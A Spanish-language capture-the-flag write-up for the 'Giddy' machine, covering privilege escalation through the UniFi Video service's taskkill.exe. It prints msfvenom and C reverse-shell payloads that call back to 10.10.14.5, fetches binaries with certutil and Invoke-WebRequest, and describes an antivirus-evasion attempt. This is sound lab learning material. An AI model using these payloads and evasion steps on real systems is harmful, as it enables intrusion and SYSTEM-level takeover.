> By **copying an arbitrary** `taskkill.exe` to `C:\ProgramData\\unifi-video\` as an unprivileged user, it is therefore possible to **escalate privileges and execute arbitrary code as NT AUTHORITY/SYSTEM**.

:o upaaaa, pues sencillo, solo debemos encontrar el nombre del servicio, generar un payload malicioso puede ser con ayuda de `msfvenom` llamado `taskkill.exe` y posicionarlo en la ruta `C:\ProgramData\\unifi-video\`. Lo siguiente seria detener o iniciar el servicio, esperar que busque el archivo `taskkill.exe`, lo ejecute y ver como obtenemos nuestra Shell (:

Démosleeeeeeeeeeeeeeeeeeeeeeeeeeeee.

...

### Generamos archivo <u>taskkill.exe</u> malicioso [🔗](#msfvenom-taskkillexe) {#msfvenom-taskkillexe}

Creemos nuestro binario `taskkill.exe` con ayuda de `msfvenom`, le indicaremos que una vez se ejecute envíe una petición hacia X puerto con una **CMD**, o sea, generamos una **Reverse Shell**:

```bash
❱ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4433 -f exe > taskkill.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Listo, ya lo tenemos, sigamos...

### Buscamos servicio relacionado con <u>unifi-video</u> [🔗](#find-service-unifivideo) {#find-service-unifivideo}

Ahora lo que debemos hacer es listar toodos los servicios del sistema y buscar específicamente alguno relacionado con `unifi-video`.

Pero F, los comandos que podemos usar o nos matan la terminal o nos devuelven errores:

```powershell
*Evil-WinRM* PS C:\ProgramData> net start
net.exe : System error 5 has occurred.
...
Access is denied.
```

```powershell
*Evil-WinRM* PS C:\ProgramData> wmic service list brief
WMIC.exe : ERROR:
...
Description = Access denied
```

```powershell
*Evil-WinRM* PS C:\ProgramData> Get-Service
Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
...
```

> Tomadas de [Hacktricks.xyz - WinPrivEsc/Services](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services).

Así que tamos tristes :(

Buscando en internet maneras de detener o iniciar procesos con **PowerShell**, encontramos dos herramientas:

* [Powershell: How to Start (**start-service**) or Stop (**stop-service**) services](https://www.windows-commandline.com/start-stop-service-using-powershell/).

Pero seguimos igual, no sabemos el nombre del servicio... 

Probando algunos randoms siempre recibimos un error, por ejemplo buscando `unifi-video` como nombre de servicio:

```powershell
*Evil-WinRM* PS C:\ProgramData\\unifi-video> Stop-Service "unifi-video"
Cannot find any service with service name 'unifi-video'.
...
```

:(

Si volvemos a nuestro exploit, en los detalles de la vulnerabilidad hace referencia a un servicio con nombre `Ubiquiti UniFi Video`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_unifi_exploitDB_service.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Así que podemos probar con ese nombre, si no nos funciona ya tendríamos una base para quitar, agregar, modificar o juntar **palabras** en busca de algún nombre para el servicio.

```powershell
*Evil-WinRM* PS C:\ProgramData\\unifi-video> Stop-Service "Ubiquiti UniFi Video"
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
```

OPAAAAAAAAAAAAAAA, si señorrrrrrrrrrr, al parecer tenemos el nombre del serviciooooooooooooooooooo, pues perfectisimo, ahora simplemente nos queda probar a subir el binario y recibir nuestra **reverse Shell**:

### Subimos el binario al sistema de diferentes maneras [🔗](#uploading-taskkillexe-ways) {#uploading-taskkillexe-ways}

Aprovechemos y subamos el binario de 3 formas, con `certutil.exe`, con una de las opciones de `PowerShell` yyy con ayuda de una carpeta compartida por **SMB**:

Levantemos un servidor web con **Python** en la ruta donde tenemos el archivo `taskkill.exe`:

```bash
❱ python3 -m http.server
```

---

##### <u>certutil.exe:</u>

---

```powershell
*Evil-WinRM* PS C:\ProgramData\\unifi-video> certutil.exe -f -urlcache -split http://10.10.14.5:8000/taskkill.exe taskkill.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.
```

Y ya lo tendriamos (:

##### <u>Usando la clase InvokeWebRequest de PowerShell:</u>

---

```powershell
*Evil-WinRM* PS C:\ProgramData\\unifi-video> IWR -uri http://10.10.14.5:8000/taskkill.exe -OutFile taskkill.exe
```

Y tambien ya tendriamos el binario en la máquina victima.

##### <u>Compartiendo una carpeta con SMB:</u>

---

```bash
❱ smbserver.py smbFolder $(pwd)
```

Ya tendríamos nuestra carpeta compartida llamada `smbFolder` situada en la ruta del binario `taskkill.exe`, ahora desde la máquina víctima le decimos que se conecte a esa carpeta, pero que además haga una copia de uno de sus archivos a la ruta actual:

```powershell
*Evil-WinRM* PS C:\ProgramData\\unifi-video> copy \\10.10.14.5\smbFolder\taskkill.exe taskkill.exe
```

Recibimos la peticion en nuestra carpeta compartida, esperamos un momento yyyyyyyyy ya tendriamos tambien nuestro archivo `taskkill.exe` (:

Listos, ahora si explotemos estooooo.

Pongamonos en escucha por el puerto **4433** que fue el que indicamos en nuestro binario malicioso:

```bash
❱ nc -lvp 4433
```

---

### Intentamos que el servicio <u>unifi-video</u> ejecute el binario malicioso [🔗](#trying-service-taskkillexe) {#trying-service-taskkillexe}

Jugando con el binario y el servicio:

* `Stop-Service "Ubiquiti UniFi Video"`
* `Start-Service "Ubiquiti UniFi Video"`

No pasa nada de nada :P y por el contrario algo que nos damos cuenta es que el sistema nos borra `taskkill.exe`, si intentamos nosotros mismo ejecutarlo obtenemos esto:

```bash
*Evil-WinRM* PS C:\ProgramData\\unifi-video> .\taskkill.exe
Program 'taskkill.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
...
```

Jmmm, al parecer el sistema esta identificando el binario como malicioso (lo és :P) y por consiguiente esta siendo borrado... Esto puede ser obra del `antivirus`, el propio `Windows Defender` o incluso de algún `App Locker`. Se pone linda la cosa ya que tendremos que bypassear alguno (o todos) de ellos :)

...

### Bypasseamos <u>Antivirus</u>, <u>Windows Defender</u>, <u>App Locker</u> y lo que se venga [🔗](#bypass-av-and-things) {#bypass-av-and-things}

---

##### Fail con <u>Phantom Evasion<u>

Buscando y buscando encontramos finalmente un recurso que hace referencia a otro recurso y ese otro recurso habla de otro recurso, ese último se llama [Phantom Evasion](https://github.com/oddcod3/Phantom-Evasion), una herramienta para eso, evadir cositas como los antivirus.

> <span style="color: #f34336;">Esta parte es de aprendizaje en cuanto a la herramienta porque al final la explote de otro modo</span> :P

Hay varios recursos que hablan de ella:

* [YT - Evasión de antivirus con Phantom Evasion](https://www.youtube.com/watch?v=fgjTbUrAHbg).
* [Cómo evadir protección antivirus con Phantom Payloads](https://noticiasseguridad.com/tutoriales/como-evadir-proteccion-antivirus-con-phantom-payloads/).

Después de descargarlo, en su ejecución la interfaz es sencilla:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_phantomEvasion_menu.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Obviaremos algunas opciones, vamos a irnos por el número `1` directamente:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_phantomEvasion_modules.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Acá (podemos jugar con la primera, lo hice de todas las maneras posibles, pero F) seleccionamos la segunda opción, o sea escribimos `2`, esta opción nos generaría un binario que al ser ejecutado con éxito devolvería una falsa shell, es funcional para saber que tenemos ejecución de comandos y que estamos bypasseando el antivirus y los diferentes bloqueos que existan.

Entonces, seleccionamos la opción `2`, nos devolverá la info inicial del binario a generar y empezara a preguntarnos algunas opciones, las importantes van a ser:

* `LHOST`: Nuestra IP, **10.10.14.5**.
* `LPORT`: El puerto donde vamos a estar en escucha, **4433**.
* `Strip executable?`: Indicamos la letra `Y`, para SIIIIIIIIIIIIIIIIIIIIII e.e Esto hace que el binario no sea tan pesado.
* La opción del certificado me daba errores, así que la cambie por `n` y ya todo perfecto.
* `Insert output filename`: **taskkill**. Que será el nombre del binario, en la opción anterior por default esta la extensión `exe`, así que tamos bien.

Nos responde:

```bash
[>] Generating code...

[>] Compiling...

[>] Strip binary...

[<>] File saved in Phantom-Evasion folder
```

Y si revisamos el directorio donde ejecutamos `phantom evasion` vemos el binario `taskkill.exe`:

```bash
❱ file taskkill.exe 
taskkill.exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows
```

Listooones, pues ahora intentemos subirlo y jugar con el servicio, pero claro, si aún no estamos en escucha por el puerto del binario (4433) lo hacemos:

```bash
❱ nc -lvp 4433
```

Subimos el binario, lo primero que vemos es que no nos lo borra, así que puede ser el bueno, encendemos y apagamos el servicio y cruzamos los dedos de los pies a ver si logramos algo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_stacyPS_startStop_service.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Es trivial cuantos warning nos va a mostrar :P peeeeeeeeeeeeeeero en cualquier momento vemos estoooooooooooooo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_nc_fakeshell_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si si siiiiiii, recibimos una petición, por lo tanto hemos bypasseado tooooooodo todito.

Pero (siempre hay peros, ihsss) no podemos hacer nada con ese payload, lo bueno es que confirmamos a `phantom evasion` como funcional, ahora solo nos quedaría probar entre sus opciones y ver cuál nos puede devolver una verdadera shell...

Pero (de nuevo un peroooooo), como ya comente antes, probé y probé y nada, no logre hacer funcionar una shell...

...

En este punto ya estaba loco locooooooo, no sabía pa onde mirar, así que necesitaba un momento de calmita, de respirar profundo y organizar ideas. Después de un rato, caí en cuenta de algo en lo que debí haber pensado desde el inicio, pero bueno, no pasa nada, aprendimos sobre la herramienta `phantom evasion`.

**Y sí nos creamos nosotros mismos un binario llamado `taskkill.exe` que haga lo que queramos? u.u jajaj**

...

Pos sí, démosle a esa idea, podemos apoyarnos del lenguaje de programación `C` y su función `system();`, simplemente para compilar el script a un formato válido en **Windows** usamos la herramienta `mingw-w64`. A darleeeee:

Entonces, si no tenemos ni idea, una búsqueda rápida en internet nos dará vaaarios ejemplos como base:

* [C Exercises: Invoke the command processor to execute a command](https://www.w3resource.com/c-programming-exercises/variable-type/c-variable-type-exercises-1.php).

Lo tomamos y nos quedamos únicamente con las librerías, la función main y la función `system`:

```c
#include<stdio.h>
#include<stdlib.h>

int main () {
    system();
} 
```

Donde `system` tendrá lo que queramos ejecutar a nivel de sistema, para no hacer más largo el writeup voy a hacer un spoiler, si no quieres verlo, NO OPRIMAS LO DE ABAJO e.e

<details>
  <summary><strong>SPOILER resolución final</strong></summary>
  
  <span style="color: yellow;">El script y el binario generado van a ser la salvación e.e (esto no era lo que iba a escribir, pero pues me gusto, así que ahí se queda).</span>
</details>

Como prueba anterior, subí el binario `nc.exe` a la máquina a ver si también era borrado, pero no, no lo borra el sistema, así que podemos indicarle al script que tome ese binario y nos haga una Reverse Shell de toda la vida:

```c
#include<stdio.h>
#include<stdlib.h>

int main () {
    system("c:\\Users\\Stacy\\Videos\\nc.exe 10.10.14.5 4433 -e cmd.exe");
} 
```

Ya con el script finalizado lo compilamos, siguiendo este hilo lo logramos:

* [How to compile executable for Windows with GCC with Linux Subsystem?](https://stackoverflow.com/questions/38786014/how-to-compile-executable-for-windows-with-gcc-with-linux-subsystem).

Inicialmente lo compilare para **64 bits** si no nos sirve, pues lo intentamos con **32**:

```bash
❱ x86_64-w64-mingw32-gcc taskkill.c -o taskkill.exe
```

```bash
❱ file taskkill.exe 
taskkill.exe: PE32+ executable (console) x86-64, for MS Windows
```

Listo, ahora simplemente subimos tooodo, nos ponemos en escucha por el puerto **4433** yyyyyy jugamos con el servicio:

...

> Me tiré tooooooooodo lo que relacione a `Ruby` por instalar una herramienta que nos ayudaba con el **Bypass de AV**. 

(Y pues se fue a la p*** el `evil-winrm` asdjflkajsldkfñl)

> Ya lo arreglé, tamos felices. Por no usar sandboxes o pequeños entornos que no afecten a las gemas y demás cositas. Algo más aprendido jajajaj a la fuerza pero aprendido.

😇

...

Ahora sí, subamos todo a la máquina:

```bash
❱ python3 -m http.server
```

```powershell
*Evil-WinRM* PS C:\ProgramData\\unifi-video> IWR -uri http://10.10.14.5:8000/taskkill.exe -OutFile taskkill.exe
*Evil-WinRM* PS C:\ProgramData\\unifi-video> IWR -uri http://10.10.14.5:8000/nc64.exe -OutFile c:\Users\Stacy\Videos\nc.exe
```

```bash
❱ nc -lvp 4433
```

Detenemos el servicio:

```powershell
*Evil-WinRM* PS C:\ProgramData\\unifi-video> stop-service "Ubiquiti UniFi Video"
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
...
```

Yyyyyyyyyyyy en nuestro listeneeeeeeeeeeeeeeeeeeeer:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_nc_NTauthoritySH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PERO CLAROOOOOOOOO QUE SIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII, OMG, mi cerebro respira e.e Tamos dentro del sistema como el usuario **nt authority\system**, el master de los masters.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_gif_menhands_done.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Veamos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

IT'S OOOOOOOOOOOOVER

...

Terminamos después de un largo camino, pero un camino llenísimo de aprendizaje, prácticamente todo lo que vimos en esta máquina fue nuevo para mí, así que increíble, muy lindo lo que hicimos y lo que probamos.

Salió un bello script (que inicialmente no era la idea, iba a ser muuucho más sencillo, pero uff, me encanto), intentamos (lo logramos en gran medida) bypassear el AV, el Windows Defender, el App Locker y lo que se nos interpusiera e.e

Muy linda máquina, brutalmente llevada a la realidad creo yo, una base de datos con 0 data importante, pero que puede permitir ejecutar comandos **SQL** y entornos super controlados, pero realmente no tanto, llega un script de visita con dos líneas y destruye todo lo que tenías "controlado" :(

Bueno basta!! Los dejo descansar y perdón que a veces me extienda o haga cosas que para algunos son obvias, pero esa es la idea, dejar la obviedad de lado y reforzar cositas e incluso dejar que alguien con menos experiencia aprenda algo nuevo. 

Nos leeremos después y a seguir rompiendo tooodoooo no jodaaaaaaaaaaaaaaaaaa!!